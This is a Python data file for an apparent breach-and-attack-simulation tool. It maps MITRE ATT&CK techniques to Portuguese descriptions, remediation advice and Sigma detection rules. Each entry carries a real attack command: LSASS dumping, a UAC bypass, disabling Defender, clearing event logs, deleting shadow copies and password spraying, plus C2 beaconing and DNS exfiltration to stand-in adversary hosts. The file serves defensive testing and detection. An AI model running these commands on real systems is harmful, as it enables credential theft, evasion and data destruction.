"""Curated MITRE ATT&CK Enterprise taxonomy, Sigma detection rules and BAS presets."""
from typing import Dict, List
from arcanum.mitre.models import TacticEnum, DefenseStatus, TechniqueEvaluation


DEFAULT_MITRE_TECHNIQUES: List[TechniqueEvaluation] = [
    # 1. Reconnaissance (TA0043)
    TechniqueEvaluation(
        technique_id="T1595.002",
        name="Vulnerability Scanning",
        tactic=TacticEnum.RECONNAISSANCE,
        tactic_id="TA0043",
        status=DefenseStatus.UNTESTED,
        description="Varredura ativa de portas e serviços à procura de vulnerabilidades não corrigidas (CVEs).",
        simulation_payload="nmap -sV -sC -Pn --script vulners 192.168.1.0/24",
        risk_level="MEDIUM",
        remediation_guidance="Implementar rate-limiting e bloquear varreduras sequenciais no firewall de borda/WAF.",
        sigma_rule_yaml="""title: Active Vulnerability Scanning Detected
status: stable
logsource:
  category: network
  product: firewall
detection:
  selection:
    proto: tcp
    connection_rate: "> 100 per second"
  condition: selection
falsepositives:
  - Vulnerability assessment scanners autorizados
level: medium""",
    ),
    TechniqueEvaluation(
        technique_id="T1592.002",
        name="Gather Victim Host Information: Software",
        tactic=TacticEnum.RECONNAISSANCE,
        tactic_id="TA0043",
        status=DefenseStatus.UNTESTED,
        description="Enumeração de versões de software, servidores web e bibliotecas via cabeçalhos HTTP e banners.",
        simulation_payload="curl -I -A 'Arcanum-Scanner/2.0' https://alvo.corp.local/",
        risk_level="LOW",
        remediation_guidance="Ocultar cabeçalhos Server, X-Powered-By e banners de versão nos servidores web.",
        sigma_rule_yaml="""title: Web Reconnaissance Software Version Discovery
status: stable
logsource:
  category: webserver
detection:
  selection:
    cs-method: HEAD
    c-useragent|contains:
      - 'nikto'
      - 'sqlmap'
      - 'nmap'
  condition: selection
level: low""",
    ),

    # 2. Resource Development (TA0042)
    TechniqueEvaluation(
        technique_id="T1583.001",
        name="Acquire Infrastructure: Domains",
        tactic=TacticEnum.RESOURCE_DEVELOPMENT,
        tactic_id="TA0042",
        status=DefenseStatus.UNTESTED,
        description="Registro e uso de domínios maliciosos ou typosquatting para infraestrutura de ataque ou phishing.",
        simulation_payload="rdap_query('login-empresa-auth.xyz')",
        risk_level="MEDIUM",
        remediation_guidance="Registrar domínios defensivos similares e utilizar feeds de ameaças de domínios recém-registrados (NRDs).",
        sigma_rule_yaml="""title: Access to Newly Registered Domain (NRD)
status: experimental
logsource:
  category: dns
detection:
  selection:
    domain_age_days: "< 30"
  condition: selection
level: medium""",
    ),

    # 3. Initial Access (TA0001)
    TechniqueEvaluation(
        technique_id="T1190",
        name="Exploit Public-Facing Application",
        tactic=TacticEnum.INITIAL_ACCESS,
        tactic_id="TA0001",
        status=DefenseStatus.UNTESTED,
        description="Exploração de falhas em aplicações web externas (SQL Injection, RCE, SSRF, IDOR).",
        simulation_payload="GET /api/v1/user?id=1%20UNION%20SELECT%20null,username,password%20FROM%20users--",
        risk_level="CRITICAL",
        remediation_guidance="Implantar WAF com regras OWASP CRS atualizadas, validar e sanitizar inputs e aplicar patches de CVEs.",
        sigma_rule_yaml="""title: SQL Injection Attempt in HTTP Request
status: stable
logsource:
  category: webserver
detection:
  selection:
    uri|contains:
      - 'UNION SELECT'
      - 'ORDER BY'
      - 'INFORMATION_SCHEMA'
  condition: selection
level: high""",
    ),
    TechniqueEvaluation(
        technique_id="T1078",
        name="Valid Accounts",
        tactic=TacticEnum.INITIAL_ACCESS,
        tactic_id="TA0001",
        status=DefenseStatus.UNTESTED,
        description="Obtenção de acesso inicial ou persistência através de credenciais legítimas vazadas ou comprometidas.",
        simulation_payload="POST /api/auth/login HTTP/1.1 { 'username': 'admin', 'password': 'CompromisedPass2026!' }",
        risk_level="HIGH",
        remediation_guidance="Exigir Autenticação Multifator (MFA FIDO2/WebAuthn) e aplicar análise de comportamento anômalo (UEBA).",
        sigma_rule_yaml="""title: Unusual Sign-In with Valid Account
status: stable
logsource:
  product: entra_id
  service: signins
detection:
  selection:
    RiskState: 'atRisk'
    IsInteractive: true
  condition: selection
level: high""",
    ),

    # 4. Execution (TA0002)
    TechniqueEvaluation(
        technique_id="T1059.001",
        name="Command and Scripting Interpreter: PowerShell",
        tactic=TacticEnum.EXECUTION,
        tactic_id="TA0002",
        status=DefenseStatus.UNTESTED,
        description="Execução de comandos interativos ou scripts PowerShell codificados para rodar ferramentas ofensivas.",
        simulation_payload="powershell.exe -NoP -NonI -W Hidden -Enc SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQp...",
        risk_level="CRITICAL",
        remediation_guidance="Habilitar Script Block Logging (Event ID 4104), Constrained Language Mode e regras de ASR no Windows Defender.",
        sigma_rule_yaml="""title: Obfuscated PowerShell EncodedCommand Execution
status: stable
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\\powershell.exe'
    CommandLine|contains:
      - ' -enc '
      - ' -encodedcommand '
      - ' -noni '
  condition: selection
level: critical""",
    ),
    TechniqueEvaluation(
        technique_id="T1059.003",
        name="Command and Scripting Interpreter: Windows Command Shell",
        tactic=TacticEnum.EXECUTION,
        tactic_id="TA0002",
        status=DefenseStatus.UNTESTED,
        description="Uso do interpretador clássico cmd.exe para executar comandos de descoberta, batch ou ferramentas de rede.",
        simulation_payload="cmd.exe /c whoami & net user /domain & ipconfig /all",
        risk_level="MEDIUM",
        remediation_guidance="Restringir privilégios locais e monitorar geração de processos filhos anômalos a partir de serviços web (IIS, Apache, w3wp).",
        sigma_rule_yaml="""title: Cmd.exe Spawned by Web Server
status: stable
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    ParentImage|endswith:
      - '\\w3wp.exe'
      - '\\httpd.exe'
      - '\\nginx.exe'
    Image|endswith: '\\cmd.exe'
  condition: selection
level: critical""",
    ),

    # 5. Persistence (TA0003)
    TechniqueEvaluation(
        technique_id="T1053.005",
        name="Scheduled Task/Job: Scheduled Task",
        tactic=TacticEnum.PERSISTENCE,
        tactic_id="TA0003",
        status=DefenseStatus.UNTESTED,
        description="Criação ou modificação de tarefas agendadas no Windows Task Scheduler para garantir persistência após reinicialização.",
        simulation_payload="schtasks /create /tn 'SystemMaintenanceTask' /tr 'C:\\ProgramData\\update.bat' /sc onstart /ru SYSTEM",
        risk_level="HIGH",
        remediation_guidance="Monitorar o log de eventos do TaskScheduler (Event IDs 106, 140) e auditar tarefas não padrão.",
        sigma_rule_yaml="""title: Suspicious Scheduled Task Creation via Schtasks
status: stable
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    CommandLine|contains:
      - 'schtasks'
      - '/create'
      - '/sc onstart'
  condition: selection
level: high""",
    ),

    # 6. Privilege Escalation (TA0004)
    TechniqueEvaluation(
        technique_id="T1068",
        name="Exploitation for Privilege Escalation",
        tactic=TacticEnum.PRIVILEGE_ESCALATION,
        tactic_id="TA0004",
        status=DefenseStatus.UNTESTED,
        description="Exploração de vulnerabilidades locais de kernel ou serviços mal configurados para saltar de usuário para SYSTEM/root.",
        simulation_payload="./cve-2024-privesc_exploit --target-pid 1024",
        risk_level="CRITICAL",
        remediation_guidance="Manter atualizações de segurança do sistema operacional em dia e desativar drivers vulneráveis (HVCI/WDAC).",
        sigma_rule_yaml="""title: Suspicious SYSTEM Process Spawned from Low Privilege Parent
status: stable
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    User|contains: 'SYSTEM'
    ParentUser|contains: 'DefaultAccount'
  condition: selection
level: critical""",
    ),
    TechniqueEvaluation(
        technique_id="T1548.002",
        name="Bypass User Account Control (UAC)",
        tactic=TacticEnum.PRIVILEGE_ESCALATION,
        tactic_id="TA0004",
        status=DefenseStatus.UNTESTED,
        description="Burlar o mecanismo UAC do Windows através do sequestro de chaves de registro auto-elevadas (ex: fodhelper, computerdefaults).",
        simulation_payload="reg add 'HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command' /v 'DelegateExecute' /f",
        risk_level="HIGH",
        remediation_guidance="Configurar a política de UAC para 'Sempre Notificar' (Always Notify) e monitorar modificações na chave ms-settings.",
        sigma_rule_yaml="""title: UAC Bypass via Fodhelper Registry Key
status: stable
logsource:
  category: registry_set
  product: windows
detection:
  selection:
    TargetObject|contains: 'ms-settings\\Shell\\Open\\command'
  condition: selection
level: critical""",
    ),

    # 7. Defense Evasion (TA0005)
    TechniqueEvaluation(
        technique_id="T1562.001",
        name="Impair Defenses: Disable or Modify Tools",
        tactic=TacticEnum.DEFENSE_EVASION,
        tactic_id="TA0005",
        status=DefenseStatus.UNTESTED,
        description="Tentativa de desativar, parar ou desinstalar agentes de segurança (EDR, antivírus, Sysmon ou Windows Defender).",
        simulation_payload="Set-MpPreference -DisableRealtimeMonitoring $true",
        risk_level="CRITICAL",
        remediation_guidance="Ativar Tamper Protection no EDR/Defender e exigir autorização de múltiplos administradores para desativação.",
        sigma_rule_yaml="""title: Windows Defender Real-Time Monitoring Disabled
status: stable
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    CommandLine|contains:
      - 'DisableRealtimeMonitoring'
      - '$true'
  condition: selection
level: critical""",
    ),
    TechniqueEvaluation(
        technique_id="T1070.001",
        name="Indicator Removal: Clear Windows Event Logs",
        tactic=TacticEnum.DEFENSE_EVASION,
        tactic_id="TA0005",
        status=DefenseStatus.UNTESTED,
        description="Limpeza dos logs de eventos do Windows para destruir rastros e dificultar a investigação forense do Blue Team.",
        simulation_payload="wevtutil.exe cl Security & wevtutil.exe cl System",
        risk_level="HIGH",
        remediation_guidance="Encaminhar logs em tempo real para um SIEM remoto (Syslog/WEC) com armazenamento imutável.",
        sigma_rule_yaml="""title: Windows Security Event Log Cleared
status: stable
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 1102
  condition: selection
level: high""",
    ),

    # 8. Credential Access (TA0006)
    TechniqueEvaluation(
        technique_id="T1003.001",
        name="OS Credential Dumping: LSASS Memory",
        tactic=TacticEnum.CREDENTIAL_ACCESS,
        tactic_id="TA0006",
        status=DefenseStatus.UNTESTED,
        description="Acesso direto à memória do processo lsass.exe para extrair hashes NTLM e tickets Kerberos em texto plano.",
        simulation_payload="rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump [LSASS_PID] C:\\temp\\lsass.dmp full",
        risk_level="CRITICAL",
        remediation_guidance="Ativar LSA Protection (RunAsPPL), Credential Guard e regra ASR de bloqueio de acesso ao LSASS.",
        sigma_rule_yaml="""title: LSASS Memory Dump via Comsvcs DLL
status: stable
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    CommandLine|contains:
      - 'comsvcs'
      - 'MiniDump'
  condition: selection
level: critical""",
    ),
    TechniqueEvaluation(
        technique_id="T1558.003",
        name="Steal or Forge Kerberos Tickets: Kerberoasting",
        tactic=TacticEnum.CREDENTIAL_ACCESS,
        tactic_id="TA0006",
        status=DefenseStatus.UNTESTED,
        description="Solicitação de Service Tickets (TGS) com criptografia RC4 fraca para contas de serviço com SPN configurado visando cracking offline.",
        simulation_payload="GetUserSPNs.py corp.local/jdoe:Password123 -request -outputfile hashes.kerberoast",
        risk_level="HIGH",
        remediation_guidance="Migrar contas de serviço para gMSA (Group Managed Service Accounts) e forçar chaves de criptografia AES-256 no Kerberos.",
        sigma_rule_yaml="""title: Kerberoasting TGS Request with RC4 Encryption
status: stable
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4769
    TicketEncryptionType: '0x17' # RC4-HMAC
    TicketOptions|contains: '0x40810000'
  condition: selection
level: high""",
    ),
    TechniqueEvaluation(
        technique_id="T1110.003",
        name="Brute Force: Password Spraying",
        tactic=TacticEnum.CREDENTIAL_ACCESS,
        tactic_id="TA0006",
        status=DefenseStatus.UNTESTED,
        description="Tentativa de autenticação com uma ou poucas senhas comuns contra dezenas ou centenas de contas de usuário.",
        simulation_payload="kerbrute passwordspray -d corp.local --dc 192.168.1.10 users.txt 'Primavera2026!'",
        risk_level="HIGH",
        remediation_guidance="Ativar proteção contra senhas fracas (Azure AD Password Protection) e bloqueio inteligente de lockout temporário.",
        sigma_rule_yaml="""title: Password Spraying Detected via Multiple Failed Logons
status: stable
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4625
    SubStatus: '0xC000006A' # Bad password
  timeframe: 5m
  condition: selection | count(TargetUserName) > 10
level: high""",
    ),

    # 9. Discovery (TA0007)
    TechniqueEvaluation(
        technique_id="T1087.002",
        name="Account Discovery: Domain Account",
        tactic=TacticEnum.DISCOVERY,
        tactic_id="TA0007",
        status=DefenseStatus.UNTESTED,
        description="Enumeração de usuários, grupos privilegiados e administradores de domínio no Active Directory via LDAP.",
        simulation_payload="net group 'Domain Admins' /domain",
        risk_level="MEDIUM",
        remediation_guidance="Monitorar consultas anômalas de LDAP de estações de trabalho comuns para os Controladores de Domínio.",
        sigma_rule_yaml="""title: Domain Admins Group Enumeration
status: stable
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    CommandLine|contains:
      - 'net group'
      - 'Domain Admins'
      - '/domain'
  condition: selection
level: medium""",
    ),

    # 10. Lateral Movement (TA0008)
    TechniqueEvaluation(
        technique_id="T1021.002",
        name="Remote Services: SMB/Windows Admin Shares",
        tactic=TacticEnum.LATERAL_MOVEMENT,
        tactic_id="TA0008",
        status=DefenseStatus.UNTESTED,
        description="Movimentação lateral entre endpoints através de compartilhamentos administrativos (C$, ADMIN$) e execução remota (PsExec).",
        simulation_payload="psexec.exe \\\\192.168.1.50 -u corp\\admin -p Pass! -s cmd.exe",
        risk_level="CRITICAL",
        remediation_guidance="Bloquear tráfego SMB (porta 445) entre estações de trabalho (micro-segmentação / isolamento de clientes).",
        sigma_rule_yaml="""title: PsExec Service Installation on Remote Host
status: stable
logsource:
  product: windows
  service: system
detection:
  selection:
    EventID: 7045
    ServiceName|contains: 'PSEXESVC'
  condition: selection
level: high""",
    ),

    # 11. Collection (TA0009)
    TechniqueEvaluation(
        technique_id="T1560.001",
        name="Archive Collected Data: Archive via Utility",
        tactic=TacticEnum.COLLECTION,
        tactic_id="TA0009",
        status=DefenseStatus.UNTESTED,
        description="Compactação de arquivos sensíveis em arquivos protegidos por senha (.zip, .7z, .rar) para preparar exfiltração.",
        simulation_payload="7z.exe a -p'SecuredVault2026' -mx9 backup_financeiro.7z C:\\DadosSensíveis\\*.*",
        risk_level="MEDIUM",
        remediation_guidance="Monitorar execução de utilitários de compressão em diretórios de dados corporativos confidenciais.",
        sigma_rule_yaml="""title: Archive Created with Password via Command Line
status: stable
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    CommandLine|contains:
      - '7z'
      - ' -p'
      - 'zip'
  condition: selection
level: medium""",
    ),

    # 12. Command and Control (TA0011)
    TechniqueEvaluation(
        technique_id="T1071.001",
        name="Application Layer Protocol: Web Protocols",
        tactic=TacticEnum.COMMAND_AND_CONTROL,
        tactic_id="TA0011",
        status=DefenseStatus.UNTESTED,
        description="Comunicação de comando e controle (C2) utilizando tráfego HTTP/HTTPS padrão com jitter e certificados SSL.",
        simulation_payload="beacon_http.py --server c2.adversary.org:443 --jitter 15 --interval 30",
        risk_level="HIGH",
        remediation_guidance="Inspecionar tráfego TLS via proxy de descriptografia (TLS Interception) e monitorar beaconing periódico com IA.",
        sigma_rule_yaml="""title: Periodic HTTP Beaconing Activity Detected
status: experimental
logsource:
  category: proxy
detection:
  selection:
    c-ip: '*'
    time_delta_variance: '< 2.0'
  condition: selection
level: high""",
    ),

    # 13. Exfiltration (TA0010)
    TechniqueEvaluation(
        technique_id="T1048.003",
        name="Exfiltration Over Alternative Protocol: Exfiltration Over DNS",
        tactic=TacticEnum.EXFILTRATION,
        tactic_id="TA0010",
        status=DefenseStatus.UNTESTED,
        description="Exfiltração furtiva de dados corporativos fragmentados e codificados em subdomínios de consultas DNS para um servidor C2.",
        simulation_payload="nslookup [BASE64_DATA_CHUNK].exfil.adversary.org 8.8.8.8",
        risk_level="HIGH",
        remediation_guidance="Implementar inspeção de DNS com detecção de entropia de subdomínio e forçar todo o DNS através de resolvedor interno.",
        sigma_rule_yaml="""title: DNS Tunneling and Data Exfiltration Query
status: stable
logsource:
  category: dns
detection:
  selection:
    query_length: '> 100'
    query_entropy: '> 4.5'
  condition: selection
level: critical""",
    ),

    # 14. Impact (TA0040)
    TechniqueEvaluation(
        technique_id="T1490",
        name="Inhibit System Recovery: Delete Volume Shadow Copies",
        tactic=TacticEnum.IMPACT,
        tactic_id="TA0040",
        status=DefenseStatus.UNTESTED,
        description="Destruição de cópias de sombra de volume (VSS) para impedir restauração do sistema antes da criptografia por ransomware.",
        simulation_payload="vssadmin.exe delete shadows /all /quiet & bcdedit /set {default} recoveryenabled No",
        risk_level="CRITICAL",
        remediation_guidance="Bloquear o comando vssadmin via regra de EDR/ASR para usuários não-administradores e manter backups imutáveis.",
        sigma_rule_yaml="""title: Volume Shadow Copy Deletion via Vssadmin
status: stable
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    CommandLine|contains:
      - 'vssadmin'
      - 'delete shadows'
      - '/quiet'
  condition: selection
level: critical""",
    ),
]
